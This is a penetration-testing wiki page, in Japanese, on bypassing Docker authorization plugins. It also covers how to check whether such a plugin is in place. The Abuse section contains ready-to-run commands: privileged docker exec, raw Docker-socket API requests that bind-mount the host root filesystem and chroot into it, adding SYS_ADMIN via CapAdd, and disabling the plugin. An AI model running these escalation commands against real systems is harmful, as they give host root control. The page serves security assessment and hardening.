# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## 概要

Runtime authorization plugins は、caller が特定の daemon action を実行できるかどうかを判断する追加の policy layer です。Docker は典型的な例です。デフォルトでは、Docker daemon と通信できるユーザーは、実質的に daemon を広範囲に制御できます。Authorization plugins は、authenticated user と要求された API operation を調べ、policy に従って request を許可または拒否することで、このモデルを限定しようとします。

この topic に専用ページが必要なのは、attacker がすでに Docker API または `docker` group のユーザーにアクセスできる場合、exploitation model が変わるためです。このような環境では、問題は単に「daemon に到達できるか」だけではありません。「daemon は authorization layer によって制限されているか、また制限されている場合、その layer は未処理の endpoints、弱い JSON parsing、または plugin-management permissions を通じて bypass できるか」も問題になります。

## Operation

request が Docker daemon に到達すると、authorization subsystem は request context を 1 つ以上の installed plugins に渡せます。plugin は authenticated user identity、request details、選択された headers、および content type が適切な場合は request または response body の一部を確認します。複数の plugins を chain でき、すべての plugins が request を許可した場合にのみ access が許可されます。

このモデルは強力に見えますが、安全性は policy author が API をどれだけ完全に理解しているかに全面的に依存します。`docker run --privileged` を block していても `docker exec` を無視する plugin、top-level の `Binds` などの alternate JSON keys を見落とす plugin、または plugin administration を許可する plugin は、制限されているという誤った安心感を生みながら、直接的な privilege-escalation paths を残す可能性があります。

## Common Plugin Targets

policy review で重要な領域は次のとおりです。

- container creation endpoints
- `HostConfig` fields such as `Binds`、`Mounts`、`Privileged`、`CapAdd`、`PidMode`、および namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- 意図した policy model の範囲外で runtime actions を間接的に trigger できる endpoint

Historically、Twistlock's `authz` plugin や `authobot` などの単純な educational plugins は、policy files と code paths によって endpoint-to-action mapping が実際にどのように実装されているかを確認できたため、このモデルを研究しやすくしました。assessment work で重要な lesson は、policy author が最も目立つ CLI commands だけでなく、API surface 全体を理解する必要があるということです。

## Abuse

最初の goal は、実際に何が block されているかを把握することです。daemon が action を deny すると、error に plugin name が leak することが多く、使用中の control の特定に役立ちます。
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
より広範な endpoint profiling が必要な場合は、`docker_auth_profiler` などの tools が有用です。これらは、plugin によって実際に許可されている API routes と JSON structures を確認するという、 otherwise repetitive な作業を自動化します。

環境で custom plugin が使用されており、API とやり取りできる場合は、実際に filtering されている object fields を列挙します。
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
これらのチェックが重要なのは、多くの認可の失敗が概念単位ではなくフィールド単位で発生するためです。plugin は CLI パターンを拒否しても、同等の API 構造を完全にブロックできない場合があります。

### Full Example: `docker exec` によるコンテナ作成後の Privilege 追加

privileged なコンテナの作成をブロックする一方で、unconfined なコンテナの作成と `docker exec` を許可する policy は、依然として bypass される可能性があります。
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
daemon が 2 番目のステップを受け入れると、ユーザーは、ポリシー作成者が制約されていると考えていた container 内で、特権付きの対話型プロセスを取得したことになります。

### Full Example: Raw API 経由の Bind Mount

脆弱なポリシーの中には、1 つの JSON 形式しか検査しないものがあります。root filesystem の bind mount が一貫してブロックされていなければ、host を mount できます。
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
同じ考え方は `HostConfig` 配下にも現れる場合があります：
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
影響は、ホストファイルシステム全体からの脱出です。重要な点は、この bypass が kernel bug ではなく、policy の適用範囲が不完全であることに起因している点です。

### Full Example: Unchecked Capability Attribute

policy が capability に関連する attribute のフィルタリングを忘れている場合、攻撃者は危険な capability を再取得する container を作成できる可能性があります。
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
`CAP_SYS_ADMIN` または同様に強力な capability が存在すると、[capabilities.md](protections/capabilities.md) および [privileged-containers.md](privileged-containers.md) で説明されている多くの breakout techniques が利用可能になります。

### Plugin を無効化する完全な例

plugin-management operations が許可されている場合、最もクリーンな bypass は、control を完全に無効化することです：
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
これは control-plane レベルでの policy failure です。authorization layer は存在しますが、制限対象だった user が依然としてそれを無効化する permission を保持しています。

## Checks

これらの commands は、policy layer が存在するか、またそれが完全なものか表面的なものに見えるかを特定することを目的としています。
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
ここで注目すべき点：

- plugin name を含む Denial message は、authorization layer の存在を確認でき、多くの場合、正確な実装を明らかにします。
- attacker から見える plugin list だけで、disable または reconfigure 操作が可能かどうかを発見できる場合があります。
- 明らかな CLI action だけをブロックし、raw API request をブロックしない policy は、別途証明されるまで bypass 可能なものとして扱うべきです。

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | デフォルトでは有効化されていない | authorization plugin が設定されていない限り、Daemon access は実質的に all-or-nothing | 不完全な plugin policy、allowlist ではなく blacklist を使用、plugin management を許可、field-level blind spots |
| Podman | 一般的な直接相当機能はない | Podman は通常、Docker-style authz plugin よりも Unix permissions、rootless execution、API exposure の判断に依存する | rootful Podman API を広範囲に公開、弱い socket permissions |
| containerd / CRI-O | 異なる control model | これらの Runtime は通常、Docker authz plugin ではなく、socket permissions、node trust boundary、上位層の orchestrator control に依存する | workload への socket の mount、弱い node-local trust assumption |
| Kubernetes | Docker authz plugin ではなく、API-server 層と kubelet 層で authn/authz を使用 | Cluster RBAC と admission control が主な policy layer | 過剰に広い RBAC、弱い admission policy、kubelet または Runtime API の直接公開 |

{{#include ../../../banners/hacktricks-training.md}}
